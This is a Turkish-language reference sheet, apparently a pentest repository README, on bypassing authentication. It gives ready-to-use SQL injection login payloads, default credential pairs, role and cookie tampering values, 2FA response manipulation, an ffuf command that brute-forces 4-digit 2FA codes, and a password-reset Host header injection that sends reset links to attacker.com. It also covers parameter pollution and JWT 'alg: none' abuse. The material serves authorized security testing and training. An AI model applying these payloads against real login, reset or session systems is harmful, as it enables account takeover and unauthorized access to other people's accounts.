# 🔐 Kimlik Doğrulama Atlatma (Auth Bypass) Başvuru Kılavuzu

[🇬🇧 English](../../README.md) • [🇮🇹 Versione Italiana](README.it.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

## 🔍 Giriş Formu Atlatma Teknikleri (Login Bypass)

### SQL Enjeksiyonu ile Giriş Atlatma
Giriş formlarında kullanıcı adı alanında denenir:
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Yaygın Varsayılan Parolalar (Default Credentials)
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### İstek Parametresi Manipülasyonu
Kayıt veya profil güncelleme isteklerinde rol parametrelerini zorlama:
```http
# Kullanıcı yetki alanları
user_type=admin
role=administrator
isAdmin=true
admin=1

# Doğrulama adımlarını atlama
verified=true
mfa_verified=true
```

---

## 🔑 İki Aşamalı Doğrulama (2FA / MFA) Atlatma

### Yanıt Manipülasyonu (Response Manipulation)
Burp Suite ile sunucudan dönen olumsuz yanıtı olumluya çevirme:
```http
# false değerini true yapma
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Durum Kodu (Status Code) Manipülasyonu
```http
# 401 Unauthorized veya 403 Forbidden dönüyorsa:
# Burp Suite proxy ile yanıt durum kodunu HTTP/1.1 200 OK olarak değiştirin
```

### Doğrudan URL Gezinimi (Direct Navigation)
```http
# Kullanıcı adı ve parola girildikten sonra 2FA sayfasına yönlendirildiğinde:
/login → /2fa → /dashboard
# 2FA kodunu girmeden doğrudan /dashboard veya /profile sayfasına gitmeyi deneyin
```

### 4 Haneli Kod Brute-Force Denemesi
```bash
# Hız limiti (Rate Limit) yoksa 4 haneli kodları otomatik deneme
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Kodun Yeniden Kullanımı (Code Reuse)
```http
# Eski veya süresi dolmuş kodları tekrar göndermeyi deneyin
# Aynı kodu birden fazla istekte eşzamanlı (Race Condition) deneyin
```

### Boş veya Null Değer Gönderme
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Parola Sıfırlama Atlatma (Password Reset Bypass)

### Host Başlığı Enjeksiyonu (Host Header Injection)
Parola sıfırlama e-postasındaki linkin saldırganın sunucusuna yönlendirilmesi:
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Token Tahmini ve Manipülasyonu
```http
# Tahmin edilebilir veya sıralı tokenlar
token=1
token=admin
token=base64(user_id)

# Token'ın başka hesapta kullanımı (Kendi hesabınız için aldığınız sıfırlama tokenını kurbanın e-postasıyla kullanma)
```

### HTTP Parametre Kirliliği (Parameter Pollution)
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Yanıtta Token İfşası (Token Leak in Response)
Parola sıfırlama isteği atıldığında sunucu yanıtını inceleyin; bazen sıfırlama token'ı yanıtta döner:
```json
{"token": "abc123token", "email": "victim@target.com"}
```

---

## 🛡️ Oturum ve Çerez (Cookie) Atlatma

### Çerez Manipülasyonu
```http
# Çerez değerlerini doğrudan tarayıcı veya Burp üzerinden değiştirin:
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### JWT Manipülasyonu
```json
// Token gövdesindeki rolü değiştirme
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Oturum Sabitleme (Session Fixation)
```http
# Saldırganın oturum ID'sini kurbana zorla kabul ettirme
# Kurban giriş yaptığında saldırganın oturumu yetkili hale gelir
```

---

## 📊 Hızlı Başvuru Tablosu

| Atlatma Türü | Başlıca Teknikler |
|--------------|-------------------|
| Giriş (Login) | SQLi, varsayılan kimlik bilgileri, parametre manipülasyonu |
| 2FA / MFA | Yanıt manipülasyonu, doğrudan navigasyon, brute-force |
| Parola Sıfırlama | Host Header enjeksiyonu, token yeniden kullanımı, yanıttan token çekme |
| Oturum (Session) | Çerez tahrifatı, JWT algoritma manipülasyonu, Session Fixation |

### Yaygın Zafiyet Noktaları
```
- Giriş formları
- Parola sıfırlama adımları
- 2FA / SMS onay mekanizmaları
- "Beni hatırla" çerezleri
- E-posta doğrulama linkleri
- OAuth ve SSO entegrasyonları
```

---

## 📚 Kaynaklar

- [PortSwigger Authentication Zafiyetleri](https://portswigger.net/web-security/authentication)
- [HackTricks Authentication Bypass](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 Kimlik Doğrulama Mekanizmalarını Güçlendirin!</b><br>
  <i>Yalnızca yasal izin kapsamında test yapınız.</i>
</p>
